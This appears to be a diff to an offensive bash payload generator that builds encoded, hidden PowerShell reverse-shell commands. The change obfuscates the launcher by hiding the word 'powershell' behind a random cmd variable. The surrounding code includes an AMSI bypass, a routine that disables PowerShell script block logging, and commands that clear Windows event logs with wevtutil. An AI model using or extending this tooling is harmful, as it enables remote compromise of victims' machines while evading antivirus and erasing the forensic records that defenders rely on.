@@ -611,6 +611,7 @@ returndata=$(openssl rand -hex $(shuf -i 1-11 -n1))
 x=$(openssl rand -hex $(shuf -i 1-11 -n1))
 result=$(openssl rand -hex $(shuf -i 1-11 -n1))
 wevutil=$(shuf -er -n20  {A..Z} {a..z} | tr -d '\n')
+pwsh=$(shuf -er -n21  {A..Z} {a..z} | tr -d '\n')
 placeh=$(openssl rand -hex $(shuf -i 1-11 -n1))
 
 
@@ -622,7 +623,6 @@ then
     win="-W Hidden"
     at="@"
     #"Mini-AMSI-bypass". Not a full bypass, but maybe just enough to get other stuff up and running. Can be commented out and changed of course 
-  
     AMSIb="(([Ref].Assembly.GetTypes()|?{\$_-clike'*si*s'}).GetFields(2*20)|?{\$_-clike'*Ini*'}).SetValue(\$$placeh,\$true);"
     disableLog="[Ref].Assembly.GetType('System.Management.Automation.ScriptBlock').\$$placehGetField(\"signatures\",\"NonPublic,static\").SetValue(\$null, (New-Object 'System.Collections.Generic.HashSet[string]'));\$settings = [Ref].Assembly.GetType('System.Management.Automation.Utils').\$$placehGetField('cachedGroupPolicySettings','NonPublic,Static').GetValue(\$null);\$settings['HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging'] = @{};\$settings['HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging'].Add('EnableScriptBlockLogging\', 0);Start-Job {set-alias $wevutil wevtutil;sleep -Milliseconds 1005; $wevutil cl Microsoft-Windows-PowerShell/Operational;$wevutil cl \"Windows PowerShell\"};"
     echo -en "\nDo you wish to automatically download and run full AMSI bypass?"
@@ -693,8 +693,8 @@ else
 fi
 
 shell=$(echo -n $shell | iconv --to-code UTF-16LE | $benc --base64 -w0)
-
-rev="${pw_sh} ${win} -noprofile -executionpolicy bypass -NoExit -e ${shell}"
+#rev="set ${pwsh}=powershell && ${pw_sh} ${win} -noprofile -executionpolicy bypass -NoExit -e ${shell}"
+rev="set ${pwsh}=${pw_sh} && call %^${pwsh}% ${win} -noprofile -executionpolicy bypass -NoExit -e ${shell}"
 
 
 if [[ $5 == "vba" ]] 
